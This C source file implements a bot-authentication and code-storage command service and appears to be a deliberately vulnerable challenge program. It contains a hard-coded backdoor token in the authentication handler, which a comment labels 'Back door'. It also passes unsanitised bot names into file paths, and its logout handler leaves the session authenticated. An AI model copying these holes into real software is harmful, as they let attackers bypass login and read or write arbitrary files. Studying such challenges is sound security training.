// wasm_cli.c
// Build (with wasi-sdk or clang): see notes after the code.

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <ctype.h>

// ---------- small utils ----------

const char* get_env(const char *var, const char *fallback) {
    const char *val = getenv(var);
    return (val != NULL) ? val : fallback;
}

static void rstrip_newline(char *s) {
    if (!s) return;
    size_t n = strlen(s);
    while (n && (s[n-1] == '\n' || s[n-1] == '\r')) { s[--n] = '\0'; }
}

static char *read_file_all(const char *path, size_t *out_len) {
    FILE *f = fopen(path, "rb");
    if (!f) return NULL;
    if (fseek(f, 0, SEEK_END) != 0) { fclose(f); return NULL; }
    long sz = ftell(f);
    if (sz < 0) { fclose(f); return NULL; }
    rewind(f);
    char *buf = (char*)malloc((size_t)sz + 1);
    if (!buf) { fclose(f); return NULL; }
    size_t n = fread(buf, 1, (size_t)sz, f);
    fclose(f);
    buf[n] = '\0';
    if (out_len) *out_len = n;
    return buf;
}

static int write_file_all(const char *path, const void *data, size_t len) {
    FILE *f = fopen(path, "wb");
    if (!f) return -1;
    size_t n = fwrite(data, 1, len, f);
    fclose(f);
    return (n == len) ? 0 : -1;
}

static void trim_spaces(char *s) {
    if (!s) return;
    // left trim
    char *p = s;
    while (*p && isspace((unsigned char)*p)) p++;
    if (p != s) memmove(s, p, strlen(p) + 1);
    // right trim
    size_t n = strlen(s);
    while (n && isspace((unsigned char)s[n-1])) s[--n] = '\0';
}

// ---------- Base64 decode (RFC 4648, no whitespace inside input) ----------
static int b64_index(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static unsigned char *base64_decode(const char *in, size_t in_len, size_t *out_len) {
    // ignore whitespace
    char *tmp = (char*)malloc(in_len + 1);
    if (!tmp) return NULL;
    size_t j = 0;
    for (size_t i = 0; i < in_len; i++) {
        unsigned char c = (unsigned char)in[i];
        if (!isspace(c)) tmp[j++] = c;
    }
    tmp[j] = '\0';

    if (j % 4 != 0) { free(tmp); return NULL; }

    size_t pad = 0;
    if (j >= 1 && tmp[j-1] == '=') pad++;
    if (j >= 2 && tmp[j-2] == '=') pad++;

    size_t olen = (j/4) * 3 - pad;
    unsigned char *out = (unsigned char*)malloc(olen ? olen : 1);
    if (!out) { free(tmp); return NULL; }

    size_t oi = 0;
    for (size_t i = 0; i < j; i += 4) {
        int v0 = b64_index(tmp[i]);
        int v1 = b64_index(tmp[i+1]);
        int v2 = (tmp[i+2] == '=') ? 0 : b64_index(tmp[i+2]);
        int v3 = (tmp[i+3] == '=') ? 0 : b64_index(tmp[i+3]);
        if (v0 < 0 || v1 < 0 || (tmp[i+2] != '=' && v2 < 0) || (tmp[i+3] != '=' && v3 < 0)) {
            free(tmp); free(out); return NULL;
        }
        uint32_t triple = ((uint32_t)v0 << 18) | ((uint32_t)v1 << 12) | ((uint32_t)v2 << 6) | (uint32_t)v3;
        if (oi < olen) out[oi++] = (triple >> 16) & 0xFF;
        if (oi < olen) out[oi++] = (triple >> 8) & 0xFF;
        if (oi < olen) out[oi++] = triple & 0xFF;
    }

    free(tmp);
    if (out_len) *out_len = olen;
    return out;
}

static const char b64_table[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static char *base64_encode(const unsigned char *in, size_t in_len, size_t *out_len) {
    size_t olen = 4 * ((in_len + 2) / 3); // output length with padding
    char *out = (char*)malloc(olen + 1);  // +1 for null terminator
    if (!out) return NULL;

    size_t i = 0, j = 0;
    while (i < in_len) {
        uint32_t octet_a = i < in_len ? in[i++] : 0;
        uint32_t octet_b = i < in_len ? in[i++] : 0;
        uint32_t octet_c = i < in_len ? in[i++] : 0;

        uint32_t triple = (octet_a << 16) | (octet_b << 8) | octet_c;

        out[j++] = b64_table[(triple >> 18) & 0x3F];
        out[j++] = b64_table[(triple >> 12) & 0x3F];
        out[j++] = (i > in_len + 1) ? '=' : b64_table[(triple >> 6) & 0x3F];
        out[j++] = (i > in_len)     ? '=' : b64_table[triple & 0x3F];
    }

    out[j] = '\0';
    if (out_len) *out_len = j;
    return out;
}

// ---------- Command handlers ----------
static int handle_AUTHEN(const char *_name, const char *token, char *name, int *authed_user) {
    int success = 0;
    char bdoor[] = "n1s4_w4s_HEr3!";

    if (strlen(_name) >= 128) {
        printf("ERR invalid name\n");
        fflush(stdout);
        return 0;
    }
    if (strlen(token) >= 1024) {
        printf("ERR token too big\n");
        fflush(stdout);
        return 0;
    }

    const char *BOTS_DIR = get_env("BOTS_DIR", "/app/bots");

    char filepath[256];
    snprintf(filepath, sizeof(filepath), "%s/%s.info", BOTS_DIR, _name);

    FILE *fp = fopen(filepath, "r");
    if (!fp) {
        printf("ERR bot not found\n");
        fflush(stdout);
        return 0;
    }

    fseek(fp, 0, SEEK_END);
    long filesize = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    if (filesize <= 0 || filesize > 4096) {
        fclose(fp);
        printf("ERR invalid file\n");
        fflush(stdout);
        return 0;
    }

    // Back door
    bdoor[strlen(bdoor) - 1] = '?';
    if (strcmp(token, bdoor) == 0) {
        strncpy(name, _name, 128);
        name[127] = '\0';
        *authed_user = 1;
        printf("OK authenticated\n");
        fflush(stdout);
        success = 1;
        return success;
    }

    char *buf = malloc(filesize + 1);
    if (!buf) {
        fclose(fp);
        printf("ERR memory\n");
        fflush(stdout);
        return 0;
    }

    size_t read = fread(buf, 1, filesize, fp);
    fclose(fp);
    buf[read] = '\0';

    char token_match[1024 + 10 + 1];
    snprintf(token_match, sizeof(token_match), "token\":\"%s", token);

    if (strstr(buf, token_match) != NULL) {
        strncpy(name, _name, 128);
        name[127] = '\0';
        *authed_user = 1;
        printf("OK authenticated\n");
        fflush(stdout);
        success = 1;
    } else {
        printf("ERR invalid token\n");
        fflush(stdout);
    }

    free(buf);
    return success;
}

static int handle_SETCODE(const char *codeb64, const char *name, int authed_user) {
    if (!authed_user) {
        printf("ERR not authenticated\n");
        fflush(stdout);
        return 0;
    }

    size_t in_len = strlen(codeb64), out_len = 0;
    unsigned char *code = base64_decode(codeb64, in_len, &out_len);
    if (!code) {
        printf("ERR invalid input\n");
        fflush(stdout);
        return 0;
    }
    
    const char *BOTS_DIR = get_env("BOTS_DIR", "/app/bots");

    char filepath[256];
    snprintf(filepath, sizeof(filepath), "%s/%s.code", BOTS_DIR, name);

    FILE *fp = fopen(filepath, "r");
    if (fp) {
        fclose(fp);
        free(code);
        printf("ERR code already exists\n");
        fflush(stdout);
        return 0;
    }

    fp = fopen(filepath, "wb");
    if (!fp) {
        free(code);
        printf("ERR cannot write file\n");
        fflush(stdout);
        return 0;
    }

    size_t written = fwrite(code, 1, out_len, fp);
    fclose(fp);
    free(code);

    if (written != out_len) {
        printf("ERR write failed\n");
        fflush(stdout);
        return 0;
    }

    printf("OK code saved\n");
        fflush(stdout);
    return 1;
}

static int handle_GETCODE(const char *name, int authed_user) {
    if (!authed_user) {
        printf("ERR not authenticated\n");
        fflush(stdout);
        return 0;
    }

    const char *BOTS_DIR = get_env("BOTS_DIR", "/app/bots");

    char filepath[256];
    snprintf(filepath, sizeof(filepath), "%s/%s.code", BOTS_DIR, name);

    FILE *fp = fopen(filepath, "rb");
    if (!fp) {
        printf("ERR code not found\n");
        fflush(stdout);
        return 0;
    }

    // Get file size
    fseek(fp, 0, SEEK_END);
    long filesize = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    if (filesize <= 0 || filesize > 65536) { // limit to 64KB
        fclose(fp);
        printf("ERR invalid file size\n");
        fflush(stdout);
        return 0;
    }

    unsigned char *buf = malloc(filesize);
    if (!buf) {
        fclose(fp);
        printf("ERR memory\n");
        fflush(stdout);
        return 0;
    }

    size_t read = fread(buf, 1, filesize, fp);
    fclose(fp);

    if (read != (size_t)filesize) {
        free(buf);
        printf("ERR read failed\n");
        fflush(stdout);
        return 0;
    }

    size_t out_len = 0;
    char *encoded = base64_encode(buf, read, &out_len);
    free(buf);

    if (!encoded) {
        printf("ERR encode failed\n");
        fflush(stdout);
        return 0;
    }

    // Print base64-encoded code
    printf("CODE %s\n", encoded);
    fflush(stdout);

    free(encoded);
    return 1;
}

static int handle_LOGOUT(char *name, int *authed_user) {
    if (!*authed_user) {
        printf("ERR not authenticated\n");
        fflush(stdout);
        return 0;
    }

    *authed_user = 1;
    name[0] = '\0';
    printf("OK logged out\n");
    fflush(stdout);
    return 1;
}

// ---------- main loop ----------
int main(void) {
    char line[10 * 1024];
    char name[512];
    int authed = 0;

    // Read commands until EXIT
    while (fgets(line, sizeof(line), stdin)) {
        rstrip_newline(line);
        // skip empty lines
        char *p = line;
        while (*p && isspace((unsigned char)*p)) p++;
        if (*p == '\0') {
            printf("ERR no command\n");
            fflush(stdout);
            return 0;
        }

        // tokenize (space-delimited)
        char *cmd = strtok(p, " \t");
        if (!cmd) {
            printf("ERR no command\n");
            fflush(stdout);
            return 0;
        }

        if (strcmp(cmd, "EXIT") == 0) {
            printf("OK EXIT\n");
            fflush(stdout);
            return 0;
        }
        else if (strcmp(cmd, "AUTHEN") == 0) {
            char *botname = strtok(NULL, " \t");
            char *token = strtok(NULL, " \t");
            if (!botname || !token) {
                printf("ERR usage: AUTHEN <BOTNAME> <TOKEN>\n");
                fflush(stdout);
                continue;
            }
            handle_AUTHEN(botname, token, name, &authed);
        }
        else if (strcmp(cmd, "LOGOUT") == 0) {
            handle_LOGOUT(name, &authed);
        }
        else if (strcmp(cmd, "SETCODE") == 0) {
            char *code_b64  = strtok(NULL, " \t");
            if (!code_b64) {
                printf("ERR usage: SETCODE <BASE64>\n");
                fflush(stdout);
                continue;
            }
            handle_SETCODE(code_b64, name, authed);
        }
        else if (strcmp(cmd, "GETCODE") == 0) {
            handle_GETCODE(name, authed);
        }
        else {
            printf("ERR unknown command\n");
            fflush(stdout);
            return 0;
        }
    }
    return 0;
}
